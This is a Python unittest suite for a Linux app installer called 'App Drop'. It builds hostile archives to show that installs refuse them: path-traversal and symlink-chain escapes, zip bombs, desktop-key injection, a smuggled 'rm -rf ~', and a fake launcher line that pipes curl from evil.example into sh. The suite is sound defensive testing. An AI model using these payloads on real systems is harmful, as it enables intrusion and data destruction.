#!/usr/bin/env python3
"""Gate: App Drop installs an application from a FILE — inside the person's home, with nothing
executed before consent, and nothing an archive says taken on trust.

WHY THIS EXISTS

"Put it in Applications and it is an app" is the promise. The threats are the oldest ones in
software distribution, and each has a test here that builds the hostile file for real:

  * an archive member named `../../.bashrc`, an absolute path, a link that leaves the tree, a
    device node — every one refused, with NOTHING written outside the app's own folder;
  * a bomb that expands far beyond its size — refused;
  * a package's own .desktop file saying `Exec=sh -c "curl … | sh"` — never copied: the launcher
    entry is written by MoOS and points at a file inside the app's folder;
  * a file merely CALLED `.AppImage` — what a file IS (its magic bytes) decides, never its name;
  * a `.flatpakref` naming a remote other than Flathub — a new publisher to trust: refused;
  * a folder the person made themselves in ~/Applications — never adopted, never overwritten;
  * a failed update — the version that worked comes back.

It also runs the whole chain through the real `moos-storectl install-file`, so the job document
and the Island's presence token are proven for a dropped file, and proves the AppImage path never
extracts without the sandbox.
"""

from __future__ import annotations

import importlib.machinery
import importlib.util
import io
import json
import os
import signal
import stat
import subprocess
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "system_files/usr/lib/moos"))
import moos_appdrop as appdrop  # noqa: E402

STORECTL = ROOT / "system_files/usr/bin/moos-storectl"
ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
APPIMAGE = b"\x7fELF\x02\x01\x01\x00AI\x02" + b"\x00" * 54
GOOD_DESKTOP = ("[Desktop Entry]\nType=Application\nName=Note Forge\nComment=Write things down\n"
                "Exec=sh -c \"curl https://evil.example | sh\"\nIcon=noteforge\n"
                "Categories=Office;Utility;X-Evil;\nStartupWMClass=noteforge\n")


class Home(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = Path(self.tmp.name) / "home"
        (self.home / "Downloads").mkdir(parents=True)
        self.saved = {k: os.environ.get(k) for k in ("HOME", "XDG_DATA_HOME", "XDG_RUNTIME_DIR", "XDG_CACHE_HOME", "PATH")}
        os.environ["HOME"] = str(self.home)
        os.environ.pop("XDG_DATA_HOME", None)
        # No menu tools: a gate must not rebuild the real desktop's menu.
        os.environ["PATH"] = str(Path(self.tmp.name) / "empty-bin")
        self.outside = Path(self.tmp.name) / "OUTSIDE"

    def tearDown(self):
        for key, value in self.saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
        self.tmp.cleanup()

    def download(self, name: str, data: bytes) -> Path:
        path = self.home / "Downloads" / name
        path.write_bytes(data)
        return path

    def tar_bytes(self, members: list[tuple[tarfile.TarInfo, bytes | None]], mode: str = "w:gz") -> bytes:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode=mode) as bundle:
            for info, data in members:
                bundle.addfile(info, io.BytesIO(data) if data is not None else None)
        return buffer.getvalue()

    def zip_bytes(self, members: list[tuple]) -> bytes:
        """A .zip from (name, data) file members, (name, data, "exe") programs, or
        (name, target, "link") symlink members."""
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as bundle:
            for item in members:
                if len(item) == 3:
                    info = zipfile.ZipInfo(item[0])
                    mode = {"link": stat.S_IFLNK | 0o777, "exe": stat.S_IFREG | 0o755}[item[2]]
                    info.external_attr = mode << 16
                    bundle.writestr(info, item[1])
                else:
                    bundle.writestr(item[0], item[1])
        return buffer.getvalue()

    @staticmethod
    def links_leaving(folder: Path) -> list[str]:
        """Every symlink under `folder` whose fully resolved target is outside it."""
        found: list[str] = []
        real = folder.resolve()
        for current, folders, files in os.walk(folder):        # os.walk never follows a link
            for name in folders + files:
                path = Path(current) / name
                target = Path(os.path.realpath(path))
                if path.is_symlink() and not target.is_relative_to(real):
                    found.append(f"{path.relative_to(folder)} -> {target}")
        return found

    @staticmethod
    def member(name: str, data: bytes = b"", mode: int = 0o644) -> tuple[tarfile.TarInfo, bytes]:
        info = tarfile.TarInfo(name)
        info.size = len(data)
        info.mode = mode
        return info, data

    def portable_app(self) -> bytes:
        return self.tar_bytes([
            self.member("noteforge-2.1/noteforge", ELF, 0o755),
            self.member("noteforge-2.1/lib/libthing.so", ELF, 0o755),
            self.member("noteforge-2.1/share/noteforge.desktop", GOOD_DESKTOP.encode()),
            self.member("noteforge-2.1/share/icons/noteforge.png", b"\x89PNG\r\n\x1a\n" + b"0" * 64),
        ])

    def nothing_escaped(self):
        self.assertFalse(self.outside.exists(), "something was written OUTSIDE the app's folder")
        self.assertFalse((self.home / ".bashrc").exists())


class WhatAFileIs(Home):
    def test_magic_decides_and_a_name_is_never_trusted_upwards(self):
        cases = {
            "Real.AppImage": (APPIMAGE, "appimage"),
            "Liar.AppImage": (b"#!/bin/sh\nrm -rf ~\n", "unknown"),
            "plain-elf": (ELF, "unknown"),
            "pkg.rpm": (b"\xed\xab\xee\xdb" + b"\0" * 60, "rpm"),
            "pkg.deb": (b"!<arch>\ndebian-binary   1700000000  0     0     100644  4         `\n2.0\n", "deb"),
            "setup.exe": (b"MZ" + b"\0" * 60, "windows"),
            "game.apk": (b"PK\x03\x04" + b"\0" * 60, "android"),
            "tool.zip": (b"PK\x03\x04" + b"\0" * 60, "archive"),
            "app.flatpakref": (b"[Flatpak Ref]\nName=org.example.App\n", "flatpakref"),
            "notes.txt": (b"hello", "unknown"),
        }
        for name, (data, expected) in cases.items():
            with self.subTest(name=name):
                self.assertEqual(appdrop.sniff(self.download(name, data)), expected)

    def test_names_are_a_persons_names(self):
        for file_name, expected in (("Obsidian-1.8.9-x86_64.AppImage", "Obsidian"),
                                    ("blender-4.3.2-linux-x64.tar.xz", "Blender"),
                                    ("krita_5.2.6-x86_64.appimage", "Krita"),
                                    ("Standard-Notes-3.195.13-linux-x86_64.AppImage", "Standard Notes"),
                                    ("LibreWolf.x86_64.AppImage", "LibreWolf.x86 64")):
            with self.subTest(file=file_name):
                name = appdrop.display_name(file_name)
                if file_name.startswith("LibreWolf"):
                    self.assertTrue(name.startswith("LibreWolf"))
                else:
                    self.assertEqual(name, expected)
        self.assertRegex(appdrop.slugify("مفكرة", "مفكرة.AppImage"), r"^app-[0-9a-f]{10}$")

    def test_only_the_persons_own_plain_files_are_looked_at(self):
        real = self.download("Tool.AppImage", APPIMAGE)
        link = self.home / "Downloads/link.AppImage"
        link.symlink_to(real)
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.inspect(link)
        self.assertEqual(refused.exception.code, "not_a_plain_file")
        stranger = Path(self.tmp.name) / "elsewhere.AppImage"
        stranger.write_bytes(APPIMAGE)
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.inspect(stranger)
        self.assertEqual(refused.exception.code, "outside_home")
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.inspect(self.home / "Downloads/missing.AppImage")
        self.assertEqual(refused.exception.code, "file_missing")

    def test_a_flatpakref_is_accepted_only_for_flathub(self):
        good = self.download("app.flatpakref", b"[Flatpak Ref]\nName=org.mozilla.firefox\nBranch=stable\n"
                                                b"Url=https://dl.flathub.org/repo/\nIsRuntime=false\n")
        plan = appdrop.inspect(good)
        self.assertEqual((plan.kind, plan.flatpak_id, plan.supported), ("flatpakref", "org.mozilla.firefox", True))
        for body, code in ((b"[Flatpak Ref]\nName=org.evil.App\nUrl=https://evil.example/repo/\n", "foreign_remote"),
                           (b"[Flatpak Ref]\nName=org.evil.App\n", "foreign_remote"),
                           (b"[Flatpak Ref]\nName=x; rm -rf ~\nUrl=https://dl.flathub.org/repo/\n", "bad_flatpakref"),
                           (b"[Flatpak Ref]\nName=org.freedesktop.Platform\nIsRuntime=true\n"
                            b"Url=https://dl.flathub.org/repo/\n", "bad_flatpakref")):
            with self.subTest(code=code), self.assertRaises(appdrop.DropError) as refused:
                appdrop.inspect(self.download("bad.flatpakref", body))
            self.assertEqual(refused.exception.code, code)

    def test_other_kinds_are_handed_on_or_refused_honestly(self):
        self.assertEqual(appdrop.inspect(self.download("p.rpm", b"\xed\xab\xee\xdb" + b"\0" * 60)).handoff, "rpm")
        self.assertEqual(appdrop.inspect(self.download("s.exe", b"MZ" + b"\0" * 60)).handoff, "foreign")
        deb = appdrop.inspect(self.download("p.deb", b"!<arch>\ndebian-binary   1 0 0 100644 4 `\n2.0\n"))
        self.assertEqual((deb.supported, deb.handoff, deb.refusal), (False, "", "deb_not_native"))


class AppDropOwnership(Home):
    def manual(self, slug, receipt):
        target = self.home / "Applications" / slug
        target.mkdir(parents=True)
        canary = target / "owner-document.txt"
        canary.write_text("the person's file, not App Drop's", encoding="utf-8")
        record = appdrop.manifest_dir() / f"{slug}.json"
        record.parent.mkdir(parents=True, exist_ok=True)
        record.write_text(json.dumps(receipt), encoding="utf-8")
        return target, canary, record

    def test_remove_requires_a_receipt_of_this_app_and_kind(self):
        receipts = [{}, {"schema": 1, "id": "another", "kind": "archive"},
                    {"schema": 99, "id": "manual-2", "kind": "archive"},
                    {"schema": 1, "id": "manual-3", "kind": "other"}]
        for number, receipt in enumerate(receipts):
            slug = f"manual-{number}"
            with self.subTest(receipt=receipt):
                target, canary, record = self.manual(slug, receipt)
                self.assertFalse(appdrop.remove(slug))
                self.assertEqual(canary.read_text(encoding="utf-8"), "the person's file, not App Drop's")
                self.assertTrue(record.exists(), "an unowned receipt was deleted")

    def test_an_invalid_receipt_never_adopts_a_manual_directory(self):
        target, canary, record = self.manual("manual-app", {})
        download = self.download("manual-app.zip", self.zip_bytes([("run", ELF, "exe")]))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.plan_for(download, "Manual App", "manual-app")
        self.assertEqual(refused.exception.code, "name_taken")
        self.assertEqual(canary.read_text(encoding="utf-8"), "the person's file, not App Drop's")

    def test_a_linked_receipt_never_owns_a_manual_directory(self):
        slug = "manual-app"
        target, canary, record = self.manual(slug, {})
        outside = Path(self.tmp.name) / "external-receipt.json"
        outside.write_text(json.dumps({"schema": 1, "id": slug, "kind": "archive"}))
        record.unlink()
        record.symlink_to(outside)
        self.assertEqual(appdrop.read_record(slug), {})
        self.assertFalse(appdrop.remove(slug))
        self.assertTrue(record.is_symlink())
        self.assertTrue(outside.exists())
        self.assertTrue(canary.exists())

    def test_a_linked_app_directory_is_never_adopted(self):
        slug = "manual-app"
        target, canary, record = self.manual(slug, {"schema": 1, "id": slug, "kind": "archive"})
        outside = Path(self.tmp.name) / "external-app"
        target.rename(outside)
        target.symlink_to(outside, target_is_directory=True)
        download = self.download("manual-app.zip", self.zip_bytes([("run", ELF, "exe")]))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.plan_for(download, "Manual App", slug)
        self.assertEqual(refused.exception.code, "name_taken")
        self.assertTrue((outside / canary.name).exists())
        self.assertTrue(target.is_symlink())

    def test_a_real_file_install_keeps_its_adopted_ownership(self):
        download = self.download("noteforge-2.1.tar.gz", self.portable_app())
        manifest = appdrop.install(appdrop.inspect(download))
        self.assertEqual(appdrop.read_record("noteforge"), manifest)
        loader = importlib.machinery.SourceFileLoader("appdrop_adoption_fixture", str(STORECTL))
        spec = importlib.util.spec_from_loader(loader.name, loader)
        module = importlib.util.module_from_spec(spec)
        sys.modules[loader.name] = module
        loader.exec_module(module)
        controller = object.__new__(module.Controller)
        self.assertTrue(controller._adopted("noteforge", {"install": {"kind": "appdrop"}}))
        plan = appdrop.plan_for(download, "Note Forge", "noteforge")
        self.assertTrue(plan.replaces)
        appdrop.install(plan)
        self.assertTrue(controller._adopted("noteforge", {"install": {"kind": "appdrop"}}))
        self.assertTrue(appdrop.remove("noteforge"))
        self.assertFalse((self.home / "Applications/noteforge").exists())


class PortableArchives(Home):
    def test_a_portable_app_becomes_an_app(self):
        plan = appdrop.inspect(self.download("noteforge-2.1-linux-x86_64.tar.gz", self.portable_app()))
        self.assertEqual((plan.kind, plan.name, plan.slug), ("archive", "Noteforge", "noteforge"))
        stages: list[str] = []
        manifest = appdrop.install(plan, progress=lambda stage, _pct: stages.append(stage))
        app_dir = self.home / "Applications/noteforge"
        self.assertTrue((app_dir / "noteforge").is_file(), "the single top-level folder must be unwrapped")
        self.assertEqual(manifest["exec"], str((app_dir / "noteforge").resolve()))
        entry = (self.home / ".local/share/applications/appdrop-noteforge.desktop").read_text(encoding="utf-8")
        # Display fields are read; the package's Exec line is NOT.
        self.assertIn("Name=Note Forge", entry)
        self.assertIn("Comment=Write things down", entry)
        self.assertNotIn("curl", entry)
        self.assertNotIn("sh -c", entry)
        self.assertIn(f'Exec="{app_dir.resolve()}/noteforge" %U', entry)
        self.assertIn("Categories=Office;Utility;", entry)
        self.assertNotIn("X-Evil", entry)
        self.assertIn(str(app_dir.resolve() / "share/icons/noteforge.png"), entry)
        self.assertIn("X-MoOS-AppDrop=noteforge", entry)
        self.assertEqual(stages[0], "inspecting_file")
        self.assertIn("integrating_app", stages)
        self.assertEqual([a["id"] for a in appdrop.installed()], ["noteforge"])
        # …and it leaves as cleanly as it came.
        self.assertTrue(appdrop.remove("noteforge"))
        self.assertFalse(app_dir.exists())
        self.assertFalse((self.home / ".local/share/applications/appdrop-noteforge.desktop").exists())
        self.assertEqual(appdrop.installed(), [])
        self.assertFalse(appdrop.remove("noteforge"))

    def test_hostile_members_write_nothing_anywhere(self):
        link = tarfile.TarInfo("app/escape"); link.type = tarfile.SYMTYPE; link.linkname = "../../../OUTSIDE"
        hard = tarfile.TarInfo("app/hard"); hard.type = tarfile.LNKTYPE; hard.linkname = "/etc/passwd"
        device = tarfile.TarInfo("app/null"); device.type = tarfile.CHRTYPE; device.devmajor = 1; device.devminor = 3
        attacks = {
            "dotdot": [self.member("app/ok", ELF, 0o755), self.member("../../../OUTSIDE", b"pwned")],
            "absolute": [self.member(str(self.outside), b"pwned")],
            "home": [self.member("../../.bashrc", b"pwned")],
            "symlink": [(link, None)],
            "hardlink": [(hard, None)],
            "device": [(device, None)],
        }
        for label, members in attacks.items():
            with self.subTest(attack=label):
                plan = appdrop.inspect(self.download(f"evil-{label}.tar.gz", self.tar_bytes(members)))
                with self.assertRaises((appdrop.DropError, tarfile.TarError)):
                    appdrop.install(plan)
                self.nothing_escaped()
                self.assertFalse((self.home / f"Applications/evil-{label}").exists(),
                                 "a refused archive must leave no half-installed app behind")
                self.assertEqual(appdrop.installed(), [])

    def test_a_name_cannot_write_keys_into_the_launcher(self):
        # Reproduced 2026-10-14: a member whose name carried line breaks became the Icon path,
        # and the launcher MoOS wrote then held MimeType= and X-Injected= lines of its own.
        hostile = "noteforge-2.1/share/icons/a\nMimeType=x-scheme-handler/moos;\nX-Injected=yes\nb.png"
        members = [self.member("noteforge-2.1/noteforge", ELF, 0o755),
                   self.member(hostile, b"\x89PNG\r\n\x1a\n" + b"0" * 64)]
        plan = appdrop.inspect(self.download("noteforge-2.1.tar.gz", self.tar_bytes(members)))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "unsafe_archive")
        self.assertFalse((self.home / "Applications/noteforge").exists())
        launchers = self.home / ".local/share/applications"
        self.assertEqual(list(launchers.glob("*.desktop")) if launchers.exists() else [], [])

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as bundle:
            bundle.writestr("app/run", ELF)
            bundle.writestr("app/icon\rX-Injected=yes.png", b"x")
        plan = appdrop.inspect(self.download("evilname.zip", buffer.getvalue()))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "unsafe_archive")

        launcher = {"exec": "/home/x/Applications/a/run", "name": "A", "comment": "",
                    "icon": "/home/x/Applications/a/i\nX-Injected=yes", "categories": "Utility;",
                    "wm_class": "", "terminal": "false"}
        with self.assertRaises(appdrop.DropError):
            appdrop.desktop_entry(launcher, "a")

    def test_a_hostile_zip_is_refused_too(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as bundle:
            bundle.writestr("app/run", ELF)
            bundle.writestr("../../../OUTSIDE", b"pwned")
        plan = appdrop.inspect(self.download("evilzip.zip", buffer.getvalue()))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "unsafe_archive")
        self.nothing_escaped()

    def test_a_symlink_chain_cannot_write_through_itself_out_of_the_tree(self):
        # Reproduced 2026-10-15 (CVE-class): three in-tree links — esc -> x/.., x -> y/.., y -> .
        # — each resolve inside the staging folder on their own, but together `esc` points two
        # levels above it. The old zip path validated each link once at write time, then wrote a
        # later regular member THROUGH the completed chain into ~/.config/autostart, surviving a
        # "failed" install and running at the next login. The install tree is ~/Applications/
        # .<slug>.installing, so ~/.config is exactly two levels up.
        poison = (b"[Desktop Entry]\nType=Application\nExec=/bin/sh -c 'touch "
                  + str(self.outside).encode() + b"'\n")
        members = [("esc", "x/..", "link"), ("x", "y/..", "link"), ("y", ".", "link"),
                   ("AppRun", ELF),
                   ("esc/.config/autostart/pwn.desktop", poison)]
        plan = appdrop.inspect(self.download("chain.zip", self.zip_bytes(members)))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "unsafe_archive")
        self.nothing_escaped()
        self.assertFalse((self.home / ".config/autostart/pwn.desktop").exists(),
                         "a symlink chain wrote a file into ~/.config/autostart")
        self.assertFalse((self.home / "Applications/chain").exists())
        self.assertEqual(appdrop.installed(), [])

    def test_the_symlink_chain_is_refused_at_extraction_and_leaves_nothing_outside(self):
        # The tight proof against extract_zip itself: the reviewer's exact three-link chain plus a
        # regular member under the first link. Nothing is written above the extraction root.
        root = self.home / "Applications/.probe.installing"
        root.mkdir(parents=True)
        members = [("esc", "x/..", "link"), ("x", "y/..", "link"), ("y", ".", "link"),
                   ("esc/.config/autostart/pwn.desktop", b"pwned")]
        archive = self.download("chain2.zip", self.zip_bytes(members))
        budget = appdrop._Budget(archive.stat().st_size, lambda: False, lambda _done: None)
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.extract_zip(archive, root, budget)
        self.assertEqual(refused.exception.code, "unsafe_archive")
        self.assertFalse((self.home / ".config/autostart/pwn.desktop").exists())
        self.nothing_escaped()

    CHAIN_ONLY = [("esc", "x/..", "link"), ("x", "y/..", "link"), ("y", ".", "link"), ("AppRun", ELF, "exe")]

    def test_a_chain_of_links_alone_is_judged_once_every_hop_exists(self):
        # The same chain with NOTHING written under it. No member forces `esc` to be a real
        # folder, so all three links are made and each, read alone, stays inside; only the last
        # check — every link's fully resolved target, once the whole chain exists — sees that
        # `esc` now points two levels up, at the home folder. Without that check this "app"
        # installed with ~/Applications/chain-only/esc -> ~.
        plan = appdrop.inspect(self.download("chain-only.zip", self.zip_bytes(self.CHAIN_ONLY)))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "unsafe_archive")
        self.assertEqual(appdrop.installed(), [])
        self.assertFalse((self.home / "Applications/chain-only").exists())
        self.assertEqual(self.links_leaving(self.home / "Applications"), [])

    def test_a_refused_archive_leaves_no_link_out_of_the_tree(self):
        # Mo Store's Windows programs call extract_zip directly, so the function keeps its own
        # promise: a refused archive takes the links it made with it, whether the chain is caught
        # by the last check or a later link is refused on sight — never a link to the home
        # folder left in the tree for some later step to follow.
        cases = {"the chain alone": self.CHAIN_ONLY,
                 "a refused link after the chain": self.CHAIN_ONLY + [("etc", "/etc", "link")]}
        for number, (label, members) in enumerate(cases.items()):
            with self.subTest(label):
                root = self.home / f"Applications/.chain{number}.installing"
                root.mkdir(parents=True)
                archive = self.download(f"chain{number}.zip", self.zip_bytes(members))
                budget = appdrop._Budget(archive.stat().st_size, lambda: False, lambda _done: None)
                with self.assertRaises(appdrop.DropError) as refused:
                    appdrop.extract_zip(archive, root, budget)
                self.assertEqual(refused.exception.code, "unsafe_archive")
                self.assertEqual(self.links_leaving(root), [])

    def test_in_tree_links_install_when_the_home_is_reached_through_a_link(self):
        # MoOS is an Atomic system: /home is itself a link to var/home, so a HOME of /home/<name>
        # — or an ~/Applications moved to a bigger disk and linked back — reaches the extraction
        # folder THROUGH a link. The zip path once built a link's target from that unresolved
        # path and judged it against the RESOLVED folder, so there every legitimate in-tree link
        # (a library's soname, AppRun -> bin/tool, lib -> lib64) was refused as "leaves the
        # archive" while the same app as a .tar installed.
        app = self.zip_bytes([("tool/bin/tool", ELF, "exe"), ("tool/AppRun", "bin/tool", "link"),
                              ("tool/lib64/libfoo.so.1", ELF, "exe"),
                              ("tool/lib64/libfoo.so", "libfoo.so.1", "link"), ("tool/lib", "lib64", "link")])
        top = Path(self.tmp.name)
        (top / "atomic/var/home/alice").mkdir(parents=True)
        (top / "atomic/home").symlink_to("var/home")                      # MoOS's /home -> var/home
        (top / "bigdisk/Applications").mkdir(parents=True)
        (top / "bob").mkdir()
        (top / "bob/Applications").symlink_to(top / "bigdisk/Applications")
        for label, home in (("HOME is /home/<name>", top / "atomic/home/alice"),
                            ("~/Applications is a link", top / "bob")):
            with self.subTest(label):
                os.environ["HOME"] = str(home)
                download = home / "Downloads/tool-1.0.zip"
                download.parent.mkdir(parents=True)
                download.write_bytes(app)
                manifest = appdrop.install(appdrop.inspect(download))
                tree = Path(manifest["directory"])
                self.assertEqual(os.readlink(tree / "lib64/libfoo.so"), "libfoo.so.1")
                self.assertEqual(os.readlink(tree / "lib"), "lib64")
                self.assertEqual(manifest["exec"], str((tree / "bin/tool").resolve()))
                self.assertEqual(self.links_leaving(tree), [])
        # The Windows-program shape: extract_zip itself, under an XDG data home reached by a link.
        (top / "data").mkdir()
        (top / "data-link").symlink_to(top / "data")
        root = top / "data-link/moos/windows-apps/tool/.app.installing"
        root.mkdir(parents=True)
        archive = self.download("tool.zip", app)
        appdrop.extract_zip(archive, root, appdrop._Budget(archive.stat().st_size, lambda: False,
                                                           lambda _done: None))
        self.assertEqual(os.readlink(root / "tool/lib64/libfoo.so"), "libfoo.so.1")
        self.assertEqual(os.readlink(root / "tool/AppRun"), "bin/tool")

    def test_a_library_soname_link_inside_the_tree_is_kept(self):
        # Legitimate Linux app layout: a library's soname is a relative in-tree link. The hardened
        # path must still create it (and point it where it says), never refuse it as an escape.
        root = self.home / "Applications/.lib.installing"
        root.mkdir(parents=True)
        members = [("app/lib/libfoo.so.1", ELF),
                   ("app/lib/libfoo.so", "libfoo.so.1", "link"),
                   ("app/run", ELF)]
        archive = self.download("lib.zip", self.zip_bytes(members))
        budget = appdrop._Budget(archive.stat().st_size, lambda: False, lambda _done: None)
        appdrop.extract_zip(archive, root, budget)
        link = root / "app/lib/libfoo.so"
        self.assertTrue(link.is_symlink(), "the in-tree library link was not created")
        self.assertEqual(os.readlink(link), "libfoo.so.1")
        self.assertEqual(link.resolve(), (root / "app/lib/libfoo.so.1").resolve())
        self.assertTrue(link.resolve().is_relative_to(root.resolve()))

    def test_a_zip_member_that_is_both_a_folder_and_a_file_is_refused(self):
        root = self.home / "Applications/.dup.installing"
        root.mkdir(parents=True)
        archive = self.download("dup.zip", self.zip_bytes([("x/", b""), ("x", ELF)]))
        budget = appdrop._Budget(archive.stat().st_size, lambda: False, lambda _done: None)
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.extract_zip(archive, root, budget)
        self.assertEqual(refused.exception.code, "unsafe_archive")

    def test_a_compressed_symlink_is_bounded_before_its_body_is_read(self):
        from unittest import mock
        root = self.home / "Applications/.large-link.installing"
        root.mkdir(parents=True)
        stream = io.BytesIO()
        with zipfile.ZipFile(stream, "w", compression=zipfile.ZIP_DEFLATED) as bundle:
            link = zipfile.ZipInfo("app/link")
            link.external_attr = (stat.S_IFLNK | 0o777) << 16
            link.compress_type = zipfile.ZIP_DEFLATED
            bundle.writestr(link, b"x" * 65536)
        archive = self.download("large-link.zip", stream.getvalue())
        budget = appdrop._Budget(archive.stat().st_size, lambda: False, lambda _done: None)
        with mock.patch.object(zipfile.ZipFile, "read", side_effect=AssertionError("oversized body was read")):
            with self.assertRaises(appdrop.DropError) as refused:
                appdrop.extract_zip(archive, root, budget)
        self.assertEqual(refused.exception.code, "unsafe_archive")

    def test_a_symlink_charges_its_utf8_bytes_and_one_entry(self):
        root = self.home / "Applications/.link-count.installing"
        root.mkdir(parents=True)
        name = "ملف"
        archive = self.download("link-count.zip", self.zip_bytes([(name, ELF), ("alias", name, "link")]))
        budget = appdrop._Budget(archive.stat().st_size, lambda: False, lambda _done: None)
        appdrop.extract_zip(archive, root, budget)
        self.assertEqual((budget.bytes, budget.files), (len(ELF) + len(name.encode("utf-8")), 2))
        self.assertEqual((root / "alias").read_bytes(), ELF)

    def test_a_symlink_over_the_byte_budget_is_refused_before_read(self):
        from unittest import mock
        root = self.home / "Applications/.link-bytes.installing"
        root.mkdir(parents=True)
        archive = self.download("link-bytes.zip", self.zip_bytes([("alias", "inside", "link")]))
        budget = appdrop._Budget(archive.stat().st_size, lambda: False, lambda _done: None)
        with mock.patch.object(appdrop, "MAX_TREE_BYTES", 5), \
                mock.patch.object(zipfile.ZipFile, "read", side_effect=AssertionError("over-budget body was read")):
            with self.assertRaises(appdrop.DropError) as refused:
                appdrop.extract_zip(archive, root, budget)
        self.assertEqual(refused.exception.code, "archive_bomb")
        self.assertEqual(list(root.iterdir()), [])

    def test_a_symlink_over_the_entry_budget_is_refused_before_read(self):
        from unittest import mock
        root = self.home / "Applications/.link-entries.installing"
        root.mkdir(parents=True)
        archive = self.download("link-entries.zip", self.zip_bytes([
            ("one", "inside", "link"), ("two", "inside", "link")]))
        budget = appdrop._Budget(archive.stat().st_size, lambda: False, lambda _done: None)
        read = zipfile.ZipFile.read
        seen = []
        def count(bundle, info, *args, **kwargs):
            seen.append(info.filename)
            return read(bundle, info, *args, **kwargs)
        with mock.patch.object(appdrop, "MAX_TREE_FILES", 1), \
                mock.patch.object(zipfile.ZipFile, "read", count):
            with self.assertRaises(appdrop.DropError) as refused:
                appdrop.extract_zip(archive, root, budget)
        self.assertEqual(refused.exception.code, "archive_bomb")
        self.assertEqual(seen, ["one"])
        self.assertEqual(list(root.iterdir()), [])

    def test_a_bomb_is_refused(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as bundle:
            bundle.writestr("bomb/zeros", b"\0" * (96 * 1024 * 1024))        # ~100 KB on disk
        plan = appdrop.inspect(self.download("bomb.zip", buffer.getvalue()))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "archive_bomb")
        self.assertFalse((self.home / "Applications/bomb").exists())

    def test_an_archive_with_nothing_to_launch_says_so(self):
        plan = appdrop.inspect(self.download("docs.tar.gz", self.tar_bytes([self.member("docs/readme.txt", b"hi")])))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "nothing_to_launch")
        self.assertFalse((self.home / "Applications/docs").exists())

    def test_setuid_and_world_writable_bits_do_not_survive(self):
        data = self.tar_bytes([self.member("tool/tool", ELF, 0o6777)])
        appdrop.install(appdrop.inspect(self.download("tool.tar.gz", data)))
        mode = stat.S_IMODE((self.home / "Applications/tool/tool").stat().st_mode)
        self.assertEqual(mode & 0o6022, 0, f"mode {oct(mode)} kept setuid/setgid or group/world write")

    def test_a_folder_the_person_made_is_never_adopted(self):
        mine = self.home / "Applications/noteforge"
        mine.mkdir(parents=True)
        (mine / "my-notes.txt").write_text("mine", encoding="utf-8")
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.inspect(self.download("noteforge-2.1.tar.gz", self.portable_app()))
        self.assertEqual(refused.exception.code, "name_taken")
        self.assertEqual((mine / "my-notes.txt").read_text(encoding="utf-8"), "mine")

    def test_a_failed_update_brings_back_the_version_that_worked(self):
        appdrop.install(appdrop.inspect(self.download("noteforge-2.1.tar.gz", self.portable_app())))
        working = (self.home / "Applications/noteforge/noteforge").read_bytes()
        broken = self.tar_bytes([self.member("noteforge-3.0/readme.txt", b"no program in this release")])
        plan = appdrop.inspect(self.download("noteforge-3.0.tar.gz", broken))
        self.assertTrue(plan.replaces)
        with self.assertRaises(appdrop.DropError):
            appdrop.install(plan)
        self.assertEqual((self.home / "Applications/noteforge/noteforge").read_bytes(), working)
        self.assertEqual([a["id"] for a in appdrop.installed()], ["noteforge"])


class CatalogueInstalls(Home):
    """Mo Store's `appdrop` kind: the catalogue names the app, and the launcher can carry its id."""

    def setUp(self):
        super().setUp()
        self.saved_dirs = os.environ.get("XDG_DATA_DIRS")
        # The machine's own /usr/share/applications must not decide what these tests see.
        self.system_share = Path(self.tmp.name) / "system-share"
        (self.system_share / "applications").mkdir(parents=True)
        os.environ["XDG_DATA_DIRS"] = str(self.system_share)
        self.launchers = self.home / ".local/share/applications"

    def tearDown(self):
        if self.saved_dirs is None:
            os.environ.pop("XDG_DATA_DIRS", None)
        else:
            os.environ["XDG_DATA_DIRS"] = self.saved_dirs
        super().tearDown()

    def photo_app(self, version: str = "0.7") -> bytes:
        desktop = ("[Desktop Entry]\nType=Application\nName=PhotoCraft\nExec=photocraft %U\n"
                   "Icon=photocraft\nStartupWMClass=photocraft\nCategories=Graphics;\n")
        return self.tar_bytes([
            self.member(f"photocraft-{version}/bin/photocraft", ELF + version.encode(), 0o755),
            self.member(f"photocraft-{version}/bin/helper", ELF, 0o755),
            self.member(f"photocraft-{version}/ai.storyteller.photocraft.desktop", desktop.encode()),
            self.member(f"photocraft-{version}/share/icons/photocraft.png", b"\x89PNG\r\n\x1a\n" + b"1" * 64),
            self.member(f"photocraft-{version}/share/icons/brand.svg", b"<svg/>"),
        ])

    def test_the_catalogue_names_the_app_not_the_file_name(self):
        download = self.download("download-1234.tar.gz", self.photo_app())
        plan = appdrop.plan_for(download, "PhotoCraft", "photocraft")
        self.assertEqual((plan.kind, plan.slug, plan.name), ("archive", "photocraft", "PhotoCraft"))
